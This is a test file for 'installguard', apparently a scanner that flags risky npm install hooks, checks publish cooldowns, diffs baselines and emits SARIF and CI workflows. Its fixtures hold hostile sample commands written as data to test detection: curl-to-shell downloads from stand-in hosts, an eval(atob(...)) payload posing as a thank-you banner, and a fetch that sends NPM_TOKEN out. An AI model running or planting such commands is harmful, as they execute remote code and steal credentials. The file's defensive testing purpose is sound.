import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, writeFile } from "node:fs/promises";
import { readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import { classifyScript, scanTree } from "../src/scan.js";
import { buildAllowList, renderConfig, writeConfig } from "../src/allow.js";
import { checkCooldown, readLockVersions } from "../src/cooldown.js";
import { parseArgs } from "../src/cli.js";

async function fixture() {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-"));
  const add = async (rel, pkg) => {
    const full = path.join(dir, rel);
    await mkdir(full, { recursive: true });
    await writeFile(path.join(full, "package.json"), JSON.stringify(pkg));
  };
  await writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "app", version: "1.0.0" }));
  await add("node_modules/sharp", { name: "sharp", version: "0.33.0", scripts: { install: "node-gyp rebuild" } });
  await add("node_modules/@scope/nag", { name: "@scope/nag", version: "2.0.0", scripts: { postinstall: "node ./opencollective.js" } });
  await add("node_modules/sneaky", { name: "sneaky", version: "1.2.3", scripts: { preinstall: "curl https://evil.example/x.sh | sh" } });
  await add("node_modules/plain", { name: "plain", version: "1.0.0" });
  await add("node_modules/plain/node_modules/nested", { name: "nested", version: "0.1.0", scripts: { postinstall: "node build.js" } });
  return dir;
}

test("classifyScript categorises common install hooks", () => {
  assert.deepEqual(classifyScript("node-gyp rebuild"), { category: "native-build", risk: "medium" });
  assert.equal(classifyScript("curl https://x/y.sh | sh").risk, "high");
  assert.equal(classifyScript("node ./scripts/opencollective.js").category, "funding-nag");
  assert.equal(classifyScript("node build.js").category, "script-exec");
});

test("scanTree finds scoped and nested packages, sorted by risk", async () => {
  const dir = await fixture();
  const findings = await scanTree(dir);
  const names = findings.map((f) => f.name);
  assert.equal(findings.length, 4);
  assert.equal(findings[0].name, "sneaky");
  assert.equal(findings[0].risk, "high");
  assert.ok(names.includes("@scope/nag"));
  assert.ok(names.includes("nested"));
  assert.ok(!names.includes("plain"));
});

test("buildAllowList only allows native builds", async () => {
  const findings = await scanTree(await fixture());
  const { allow, blocked } = buildAllowList(findings);
  assert.deepEqual(allow, ["sharp"]);
  assert.deepEqual(blocked, ["@scope/nag", "nested", "sneaky"]);
});

test("renderConfig emits package-manager specific config", () => {
  const cfg = renderConfig({ allow: ["sharp"] });
  assert.match(cfg.npmrc, /ignore-scripts=true/);
  assert.deepEqual(cfg.packageJson.pnpm.onlyBuiltDependencies, ["sharp"]);
  assert.match(cfg.yarnrc, /enableScripts: false/);
});

test("writeConfig is idempotent and preserves package.json", async () => {
  const dir = await fixture();
  await writeConfig(dir, { allow: ["sharp"] });
  await writeConfig(dir, { allow: ["sharp"] });
  const npmrc = await readFile(path.join(dir, ".npmrc"), "utf8");
  assert.equal(npmrc.match(/ignore-scripts=true/g).length, 1);
  const pkg = JSON.parse(await readFile(path.join(dir, "package.json"), "utf8"));
  assert.equal(pkg.name, "app");
  assert.deepEqual(pkg.pnpm.onlyBuiltDependencies, ["sharp"]);
});

test("readLockVersions parses lockfile v3 entries", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-lock-"));
  await writeFile(
    path.join(dir, "package-lock.json"),
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "app", version: "1.0.0" },
        "node_modules/left-pad": { version: "1.3.0" },
        "node_modules/@scope/tool": { version: "2.1.0", dev: true },
      },
    }),
  );
  const deps = await readLockVersions(dir);
  assert.deepEqual(
    deps.map((d) => `${d.name}@${d.version}`).sort(),
    ["@scope/tool@2.1.0", "left-pad@1.3.0"],
  );
});

test("checkCooldown flags only versions inside the window", async () => {
  const now = new Date("2026-09-05T00:00:00Z");
  const times = {
    fresh: "2026-09-04T00:00:00Z",
    old: "2024-01-01T00:00:00Z",
  };
  const fetchImpl = async (url) => {
    const name = decodeURIComponent(url.split("/").pop());
    return { ok: true, json: async () => ({ time: { "1.0.0": times[name] } }) };
  };
  const flagged = await checkCooldown(
    [
      { name: "fresh", version: "1.0.0" },
      { name: "old", version: "1.0.0" },
    ],
    { days: 7, now, fetchImpl },
  );
  assert.equal(flagged.length, 1);
  assert.equal(flagged[0].name, "fresh");
  assert.equal(flagged[0].ageHours, 24);
});

test("parseArgs handles flags, inline values and defaults", () => {
  assert.deepEqual(parseArgs([]), { command: "scan", flags: {}, positional: [] });
  assert.deepEqual(parseArgs(["cooldown", "--days", "3", "--ci"]), {
    command: "cooldown",
    flags: { days: "3", ci: true },
    positional: [],
  });
  assert.equal(parseArgs(["scan", "--min-risk=high"]).flags["min-risk"], "high");
});

// ---------------------------------------------------------------------------
// v0.2.0: baseline diffing, extra lockfile formats, hardened classifier
// ---------------------------------------------------------------------------

import { toBaseline, diffBaseline, readBaseline, writeBaseline } from "../src/baseline.js";
import { parsePnpmLock, parseYarnLock, parseNpmLock, readAnyLock } from "../src/lockfiles.js";

test("classifyScript flags obfuscation, exfil and pipe-to-shell above everything else", () => {
  assert.equal(classifyScript("curl https://x.example/a.sh | bash").category, "pipe-to-shell");
  assert.equal(classifyScript("wget -qO- http://x/y | sudo sh").risk, "high");
  // A payload dressed up as a funding banner must not be downgraded to 'low'.
  assert.equal(classifyScript("node -e \"eval(atob('ZXZpbA=='))\" # thanks for installing!").risk, "high");
  assert.equal(classifyScript("node -e 'require(\"child_process\").exec(1)'").category, "obfuscated-exec");
  assert.equal(
    classifyScript("node -e \"fetch('https://x.example?t='+process.env.NPM_TOKEN)\"").category,
    "credential-exfil",
  );
  // Legitimate cases keep their existing classification.
  assert.equal(classifyScript("node-gyp rebuild").category, "native-build");
  assert.equal(classifyScript("node ./opencollective.js").category, "funding-nag");
});

test("diffBaseline reports added, changed and removed install scripts", async () => {
  const dir = await fixture();
  const findings = await scanTree(dir);
  const baseline = toBaseline(findings);

  assert.equal(diffBaseline(findings, baseline).added.length, 0);
  assert.equal(diffBaseline(findings, baseline).changed.length, 0);

  // A hijacked release rewrites its own postinstall at a new version.
  const tampered = findings.map((f) =>
    f.name === "sharp"
      ? { ...f, version: "0.33.1", risk: "high", scripts: [{ hook: "install", command: "curl https://evil | sh", category: "pipe-to-shell", risk: "high" }] }
      : f,
  );
  const diff = diffBaseline(tampered, baseline);
  assert.equal(diff.changed.length, 1);
  assert.equal(diff.changed[0].name, "sharp");
  assert.deepEqual(diff.changed[0].reasons.sort(), ["risk", "script", "version"]);

  // A brand new package with a hook shows up as added; a dropped one as removed.
  const withNew = [...findings, { name: "newbie", version: "1.0.0", risk: "medium", scripts: [{ hook: "postinstall", command: "node x.js", category: "script-exec", risk: "medium" }] }];
  assert.equal(diffBaseline(withNew, baseline).added[0].name, "newbie");
  assert.equal(diffBaseline(findings.filter((f) => f.name !== "sneaky"), baseline).removed[0].name, "sneaky");
});

test("baseline round-trips through .installguard.json", async () => {
  const dir = await fixture();
  const findings = await scanTree(dir);
  await writeBaseline(dir, findings);
  const loaded = await readBaseline(dir);
  assert.equal(loaded.version, 1);
  assert.deepEqual(diffBaseline(findings, loaded), { added: [], changed: [], removed: [] });
  assert.equal(await readBaseline(await mkdtemp(path.join(tmpdir(), "empty-"))), null);
});

test("lockfile readers parse npm, pnpm and yarn formats", async () => {
  const npm = parseNpmLock(JSON.stringify({
    lockfileVersion: 3,
    packages: { "": { name: "app" }, "node_modules/lodash": { version: "4.17.21" }, "node_modules/@scope/x": { version: "1.0.0", dev: true } },
  }));
  assert.deepEqual(npm.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/x@1.0.0", "lodash@4.17.21"]);

  const pnpm = parsePnpmLock([
    "lockfileVersion: '6.0'",
    "packages:",
    "  /lodash@4.17.21:",
    "    resolution: {integrity: sha512-x}",
    "  /@scope/pkg@1.2.3(react@18.0.0):",
    "    dev: false",
  ].join("\n"));
  assert.deepEqual(pnpm.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/pkg@1.2.3", "lodash@4.17.21"]);

  const yarn = parseYarnLock([
    "# yarn lockfile v1",
    "",
    'lodash@^4.17.0, lodash@^4.17.21:',
    '  version "4.17.21"',
    '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"',
    "",
    '"@scope/pkg@^1.0.0":',
    '  version "1.2.3"',
  ].join("\n"));
  assert.deepEqual(yarn.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/pkg@1.2.3", "lodash@4.17.21"]);
});

test("readAnyLock picks up a pnpm project and errors clearly when none exists", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-lock-"));
  await assert.rejects(() => readAnyLock(dir), /no lockfile found/);
  await writeFile(path.join(dir, "pnpm-lock.yaml"), "packages:\n  /left-pad@1.3.0:\n    dev: false\n");
  const found = await readAnyLock(dir);
  assert.equal(found.manager, "pnpm");
  assert.equal(found.lockfile, "pnpm-lock.yaml");
  assert.deepEqual(found.deps, [{ name: "left-pad", version: "1.3.0", dev: false }]);
});

// ---------------------------------------------------------------------------
// v0.3.0: preflight, deep source inspection, dependency paths
// ---------------------------------------------------------------------------

import { referencedScriptFile, classifySource, inspectFinding } from "../src/inspect.js";
import { preflight } from "../src/preflight.js";
import { buildGraph, pathsTo, blameDirect } from "../src/graph.js";
import { createRegistry } from "../src/registry.js";

/**
 * Fake registry that behaves like npmjs.org in the way that actually bit us:
 * the abbreviated document (install-v1 accept header) carries hasInstallScript
 * but NO `time` map; only the full packument has timestamps.
 */
function fakeNpm({ times = {}, hasInstallScript = {}, scripts = {} } = {}) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    calls.push({ url, accept: init?.headers?.accept ?? null });
    const rest = decodeURIComponent(url.replace("https://registry.npmjs.org/", ""));
    const [name, version] = rest.includes("/") && !rest.startsWith("@") ? rest.split("/") : [rest, null];
    if (version) return { ok: true, json: async () => ({ name, version, scripts: scripts[`${name}@${version}`] ?? {} }) };
    const versions = Object.fromEntries(
      Object.keys(times[name] ?? {}).map((v) => [v, { version: v, hasInstallScript: !!hasInstallScript[`${name}@${v}`] }]),
    );
    if (init?.headers?.accept === "application/vnd.npm.install-v1+json") {
      return { ok: true, json: async () => ({ name, versions }) }; // deliberately no `time`
    }
    return { ok: true, json: async () => ({ name, versions, time: times[name] ?? {} }) };
  };
  return { fetchImpl, calls };
}

test("cooldown reads publish times from the full packument, not the abbreviated one", async () => {
  const now = new Date("2026-09-05T12:00:00Z");
  const { fetchImpl, calls } = fakeNpm({
    times: { fresh: { "1.0.0": "2026-09-05T06:00:00Z" }, old: { "2.0.0": "2024-01-01T00:00:00Z" } },
  });
  const flagged = await checkCooldown(
    [{ name: "fresh", version: "1.0.0" }, { name: "old", version: "2.0.0" }],
    { days: 7, now, fetchImpl },
  );
  assert.equal(flagged.length, 1, "a version published 6h ago must be flagged");
  assert.equal(flagged[0].name, "fresh");
  assert.equal(flagged[0].ageHours, 6);
  assert.equal(flagged.resolved, 2);
  // Regression guard: asking for the abbreviated doc returns no timestamps at all,
  // which silently made every project look clean.
  assert.ok(calls.every((c) => c.accept === null), "publish-time lookups must not use the abbreviated packument");
});

test("preflight finds install scripts from a lockfile with no node_modules present", async () => {
  const { fetchImpl, calls } = fakeNpm({
    times: { lodash: { "4.17.21": "2021-01-01T00:00:00Z" }, evil: { "1.0.0": "2026-09-01T00:00:00Z" } },
    hasInstallScript: { "evil@1.0.0": true },
    scripts: { "evil@1.0.0": { postinstall: "curl https://x.example/a.sh | sh" } },
  });
  const result = await preflight(
    [{ name: "lodash", version: "4.17.21" }, { name: "evil", version: "1.0.0" }],
    { registry: createRegistry({ fetchImpl }) },
  );
  assert.equal(result.checked, 2);
  assert.equal(result.findings.length, 1);
  assert.equal(result.findings[0].name, "evil");
  assert.equal(result.findings[0].risk, "high");
  assert.equal(result.findings[0].scripts[0].category, "pipe-to-shell");
  // The cheap abbreviated doc must do the filtering: only the flagged package
  // is worth a second, heavier request.
  assert.equal(calls.filter((c) => c.url.endsWith("/1.0.0") || c.url.endsWith("/4.17.21")).length, 1);
});

test("referencedScriptFile extracts the file a hook hands to node", () => {
  assert.equal(referencedScriptFile("node install.js"), "install.js");
  assert.equal(referencedScriptFile("node ./scripts/postinstall.cjs --force"), "scripts/postinstall.cjs");
  assert.equal(referencedScriptFile("node-gyp rebuild"), null);
  assert.equal(referencedScriptFile("node /etc/evil.js"), null, "absolute paths are not resolved");
});

test("classifySource reads the payload behind an innocent-looking command", () => {
  const clean = classifySource("const fs = require('fs');\nfs.writeFileSync('a', 'b');\n");
  assert.equal(clean.risk, "medium");
  assert.equal(clean.evidence.length, 0);

  const nasty = classifySource([
    "// build helper",
    "const cp = require('child_process');",
    "fetch('https://x.example/?t=' + process.env.NPM_TOKEN);",
  ].join("\n"));
  assert.equal(nasty.risk, "high");
  assert.ok(nasty.evidence.some((e) => e.category === "credential-exfil"));
  assert.ok(nasty.evidence.every((e) => e.line > 0));

  // A packed one-liner in an install script is itself the signal.
  assert.equal(classifySource(`x(${"'a',".repeat(600)})`).risk, "high");
});

test("inspectFinding upgrades risk from the file contents and refuses path escapes", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-deep-"));
  const pkgDir = path.join(dir, "node_modules", "innocent");
  await mkdir(pkgDir, { recursive: true });
  await writeFile(path.join(pkgDir, "package.json"), JSON.stringify({ name: "innocent", version: "1.0.0", scripts: { postinstall: "node setup.js" } }));
  await writeFile(path.join(pkgDir, "setup.js"), "require('child_process').exec('curl https://x.example | sh');\n");

  const findings = await scanTree(dir);
  assert.equal(findings[0].risk, "medium", "the command string alone looks ordinary");

  const deep = await inspectFinding(dir, findings[0]);
  assert.equal(deep.risk, "high");
  assert.equal(deep.scripts[0].sourceFile, "setup.js");
  assert.ok(deep.scripts[0].evidence.length > 0);

  const escaped = await inspectFinding(dir, {
    ...findings[0],
    scripts: [{ hook: "postinstall", command: "node ../../../evil.js", category: "script-exec", risk: "medium" }],
  });
  assert.equal(escaped.scripts[0].category, "path-escape");
  assert.equal(escaped.risk, "high");
});

test("why traces a transitive package back to the direct dependency that pulled it in", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-graph-"));
  await writeFile(path.join(dir, "package-lock.json"), JSON.stringify({
    name: "app",
    packages: {
      "": { name: "app", dependencies: { bundler: "^1.0.0" }, devDependencies: { linter: "^2.0.0" } },
      "node_modules/bundler": { version: "1.0.0", dependencies: { helper: "^3.0.0" } },
      "node_modules/linter": { version: "2.0.0" },
      "node_modules/helper": { version: "3.0.0", dependencies: { sneaky: "^4.0.0" } },
      "node_modules/sneaky": { version: "4.0.0" },
    },
  }));
  const graph = await buildGraph(dir);
  const paths = pathsTo(graph, "sneaky");
  assert.deepEqual(paths[0], ["app", "bundler", "helper", "sneaky"]);
  assert.deepEqual(blameDirect(paths), ["bundler"]);
  assert.equal(graph.versions.get("sneaky"), "4.0.0");
  assert.deepEqual(pathsTo(graph, "nonexistent"), []);
});

// ---------------------------------------------------------------------------
// v0.4.0: policy file, SARIF output, CI workflow generator
// ---------------------------------------------------------------------------

import { normalizePolicy, applyPolicy, readPolicy, renderPolicy } from "../src/policy.js";
import { toSarif } from "../src/sarif.js";
import { renderWorkflow, writeWorkflow, WORKFLOW_PATH } from "../src/ci.js";

const finding = (name, risk = "high", extra = {}) => ({
  name,
  version: "1.0.0",
  risk,
  path: `node_modules/${name}`,
  scripts: [{ hook: "postinstall", command: "node install.js", category: "network-download", risk }],
  ...extra,
});

test("policy allows reviewed packages and un-allows expired ones", () => {
  const policy = normalizePolicy({
    allow: {
      esbuild: { reason: "fetches its platform binary", expires: "2027-01-01" },
      sharp: "native build",
      forever: true,
    },
  });
  const now = new Date("2026-09-05T00:00:00Z");
  const findings = [finding("esbuild"), finding("sharp"), finding("forever"), finding("stranger")];
  const applied = applyPolicy(findings, policy, now);

  assert.deepEqual(applied.remaining.map((f) => f.name), ["stranger"]);
  assert.equal(applied.allowed.length, 3);
  assert.equal(applied.allowed[0].policy.reason, "fetches its platform binary");
  assert.equal(applied.expired.length, 0);

  // Same policy, read a year later: the dated allowance stops counting.
  const later = applyPolicy(findings, policy, new Date("2027-06-01T00:00:00Z"));
  assert.deepEqual(later.expired.map((f) => f.name), ["esbuild"]);
  assert.ok(later.remaining.some((f) => f.name === "esbuild" && f.policyExpired === "2027-01-01"));
  // An undated allowance is still honoured — expiry is opt-in, not a trap.
  assert.ok(later.allowed.some((f) => f.name === "sharp"));
});

test("policy surfaces a malformed expiry instead of silently allowing", () => {
  const applied = applyPolicy([finding("weird")], normalizePolicy({ allow: { weird: { expires: "soon" } } }));
  assert.equal(applied.allowed.length, 0);
  assert.match(applied.remaining[0].policyError, /invalid expires/);
});

test("readPolicy returns usable defaults when no policy file exists", async () => {
  const policy = await readPolicy(await mkdtemp(path.join(tmpdir(), "installguard-pol-")));
  assert.deepEqual(policy.allow, {});
  assert.equal(policy.failOn, "high");
  assert.equal(policy.exists, false);
  assert.equal(renderPolicy([finding("a")]).allow.a.reason, "reviewed");
});

test("SARIF output is well-formed and points at the offending source line", () => {
  const deep = finding("evil");
  deep.scripts[0].sourceFile = "install.js";
  deep.scripts[0].evidence = [{ line: 42, category: "credential-exfil", risk: "high", text: "fetch(x + process.env.NPM_TOKEN)" }];

  const sarif = toSarif([deep], { toolVersion: "0.4.0" });
  assert.equal(sarif.version, "2.1.0");
  const run = sarif.runs[0];
  assert.equal(run.tool.driver.name, "installguard");
  assert.equal(run.tool.driver.version, "0.4.0");
  assert.deepEqual(run.tool.driver.rules.map((r) => r.id), ["installguard/network-download"]);

  const [result] = run.results;
  assert.equal(result.level, "error", "high risk must map to SARIF error");
  assert.equal(result.locations[0].physicalLocation.artifactLocation.uri, "node_modules/evil/package.json");
  assert.equal(result.locations[1].physicalLocation.region.startLine, 42);
  assert.equal(result.locations[1].physicalLocation.artifactLocation.uri, "node_modules/evil/install.js");
  assert.ok(result.partialFingerprints.installguardHook.includes("evil:postinstall"));
  // Every ruleId must resolve to a declared rule, or GitHub rejects the upload.
  const declared = new Set(run.tool.driver.rules.map((r) => r.id));
  assert.ok(run.results.every((r) => declared.has(r.ruleId)));

  assert.equal(toSarif([finding("m", "medium")]).runs[0].results[0].level, "warning");
  assert.equal(toSarif([]).runs[0].results.length, 0);
});

test("ci --init writes a workflow that preflights before installing, and never clobbers", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-ci-"));
  const first = await writeWorkflow(dir, { nodeVersion: "22" });
  assert.equal(first.written, true);

  const yml = await readFile(path.join(dir, WORKFLOW_PATH), "utf8");
  assert.match(yml, /node-version: "22"/);
  assert.match(yml, /security-events: write/);
  assert.ok(
    yml.indexOf("installguard preflight --ci") < yml.indexOf("npm ci --ignore-scripts"),
    "preflight must run before anything is installed",
  );
  assert.match(yml, /upload-sarif@v3/);

  const second = await writeWorkflow(dir, {});
  assert.equal(second.written, false);
  assert.equal(second.reason, "exists");
  assert.equal((await writeWorkflow(dir, { force: true })).written, true);
  assert.ok(!renderWorkflow({ sarif: false }).includes("upload-sarif"));
});
